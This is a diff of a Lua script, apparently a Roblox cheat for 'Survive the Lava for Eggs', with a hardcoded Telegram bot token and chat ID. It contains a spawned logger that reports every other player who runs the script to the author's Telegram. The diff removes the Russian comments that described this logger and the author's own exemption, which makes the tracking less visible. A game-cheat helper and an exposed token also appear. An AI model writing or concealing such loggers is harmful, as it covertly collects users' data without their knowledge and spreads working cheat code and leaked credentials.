@@ -8,7 +8,7 @@ local TG_TOKEN = "9179755313:AAHtwstX4jeuqhySMeMC-fwclNNY99DHmCI"
 local TG_ID = "7658959090"
 local STATUS_URL = "https://raw.githubusercontent.com/provokator-hub/Survive-the-Lava-for-Eggs-/refs/heads/main/status.txt"
 
--- ТВОЙ НИК, ЧТОБЫ ТЕБЕ НЕ ПРИХОДИЛИ УВЕДОМЛЕНИЯ
+
 local MY_NAME = "Hii2bad" 
 
 local isFly, bVel, flyConn = false, nil, nil
@@ -19,7 +19,7 @@ local scriptAlive = true
 local function safePrompt(p) if p then pcall(function() fireproximityprompt(p) end) end end
 local function safeTouch(a, b) if a and b then pcall(function() firetouchinterest(a, b, 0) task.wait(0.05) firetouchinterest(a, b, 1) end) end end
 
--- ЛОГГЕР В ТЕЛЕГРАМ (ТОЛЬКО ИМЯ И ID)
+
 task.spawn(function()
     if player.Name ~= MY_NAME then
         pcall(function()
